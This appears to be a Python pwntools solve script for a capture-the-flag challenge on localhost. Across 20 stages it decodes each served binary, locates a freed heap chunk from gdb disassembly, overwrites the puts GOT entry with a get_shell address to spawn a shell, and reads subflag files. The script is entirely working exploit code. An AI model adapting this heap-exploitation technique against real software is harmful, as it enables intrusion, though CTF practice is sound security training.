from pwn import *
import os
import base64
import re
s = remote('localhost', 9988)
s.sendline('y')

for i in range(0, 20): # 20 stage
    os.system('rm target')
    print s.recvuntil('----------BINARY(base64encoded)----------\n')
    data = s.recvline()[:-1]
    with open('target', 'wb') as f:
        f.write(base64.b64decode(data))

    #### symbol get ####
    elf = ELF('./target')
    puts = elf.got['puts']
    get_shell = elf.symbols['get_shell']

    #### freed chunk index get ####
    disasmed = os.popen("gdb -batch -ex 'file target' -ex 'disassemble main'").read().replace('\n', '')
    malloc_base = int(re.findall("(?<=rbp\+rax\*8-0x)(.+?)(?=],rdx)", disasmed)[0], 16)

    freed = re.findall("(?<=rax,QWORD PTR \[rbp-0x)(.+?)(?=<free@plt>)", disasmed)
    freed = [int(x.split(']')[0],16) for x in freed]

    last_free = (malloc_base - freed[2])/8

    #### attack ####
    log.info('puts : ' + hex(puts))
    log.info('get_shell : ' + hex(get_shell))
    log.info('last_free : ' + hex(last_free))

    print s.recvuntil('[+] select chunk to modify(idx) : ')
    s.sendline(str(last_free))

    print s.recvuntil('[+] input data : ')
    s.sendline(p64(puts))

    print s.recvuntil('[+] input comment : ')
    s.sendline(p64(get_shell))

    sleep(1)
    s.sendline('cat /tmp/subflag_*')
    s.sendline('exit')

    flag = s.recvuntil('}')
    print 'flag : ' + flag

    sleep(1)
    s.sendline('1')

    s.sendline(flag)

s.interactive()
